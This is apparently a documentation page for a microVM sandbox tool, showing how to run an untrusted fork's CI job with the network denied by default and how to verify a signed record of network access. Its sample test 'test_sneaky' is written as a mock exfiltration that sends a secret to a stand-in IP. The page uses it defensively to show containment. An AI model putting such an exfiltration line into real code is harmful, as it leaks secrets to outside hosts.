# Running a CI job from a fork

A pull request from a fork ships code *and* the CI that runs it. Running that CI on your own runner
means executing an untrusted contributor's scripts with your secrets and your network in reach. Run
it in a microVM instead: the job builds and tests as usual, but it is denied the network by default,
and the host record proves it couldn't reach out even if a test tried.

The job script is [`ci-job.sh`](https://github.com/k-henry-org/agent/blob/main/docs/examples/ci-job.sh):
it unpacks the submitted sources, runs their `unittest` suite (python3 is baked into the guest
rootfs), and leaves a `report.txt`. The defaults point at the agent rootfs in `artifacts/`; add
`--unjailed` on a dev box without real root.

## A project to test

Stand in for the fork's submission with a tiny project, one passing test, one that tries to phone
home, and pack it into a single file (`--put` takes files, so tar the tree):

```console
$ mkdir -p submission/tests
$ cat > submission/tests/test_math.py <<'EOF'
import unittest
class Math(unittest.TestCase):
    def test_ok(self):
        self.assertEqual(2 + 2, 4)
    def test_sneaky(self):
        # a malicious test trying to exfiltrate — it will get nothing
        import urllib.request
        urllib.request.urlopen("http://203.0.113.9/leak?secret=hunter2", timeout=2)
EOF
$ tar cf project.tar -C submission .
```

## Run the job, contained

Inject the sources and the job script, ask for the report back, and file the record. No `--net`
means deny-by-default: the sandbox reaches nothing:

```console
$ cargo run -q -p agent-cli -- run --unjailed \
    --put project.tar --put docs/examples/ci-job.sh --get report.txt \
    --record-summary ci.json -- /bin/sh ci-job.sh
== unpacking submitted sources ==
== running the test suite ==
FAILED (errors=1)
status=fail
```

`agent run` returns the job's own exit code, so your CI still sees pass/fail: the suite failed
because `test_sneaky` raised, its `urlopen` never connected. The report is back on your host, and
the record shows why it failed the way it did:

```console
$ agent verify ci.json && echo verified   # the record is signed and tamper-evident (decision 034)
verified
$ jq -r .record ci.json | jq '{network, timing}'   # unwrap the signed envelope, then project
{
  "network": null,                     ← no NIC at all: the job could not touch the network
  "timing": { "boot_ns": 127000000, "exec_wall_ns": 2100000000 }
}
$ tail -1 report.txt
status=fail
```

`network: null` is the proof that matters: the untrusted job had no path off the host, so a leaked
secret or a poisoned dependency fetch was never possible, not merely blocked. (Numbers vary per host.)

## When the job legitimately needs the network

Some jobs must fetch dependencies. Add `--net` and allow-list exactly the registry IPs the job may
reach (`--allow` is deny-by-default and IP-based, resolve the host first, or run a pull-through
mirror on a fixed address):

```console
$ cargo run -q -p agent-cli -- run --unjailed --net \
    --allow 151.101.0.223:443/tcp \
    --put project.tar --put docs/examples/ci-job.sh --get report.txt \
    --record-summary ci.json -- /bin/sh ci-job.sh
```

Now the summary's `reached` lists exactly the registry and nothing else, and any fetch to anywhere
else lands in `denied` (the full `--record` keeps the same facts as `flows`/`denials`). Either way you get a signed-off account of what the fork's CI actually
touched, see [Observing a run from the host](./examples-observe-a-run.md) and [Containing an
agent](./examples-agent-containment.md).
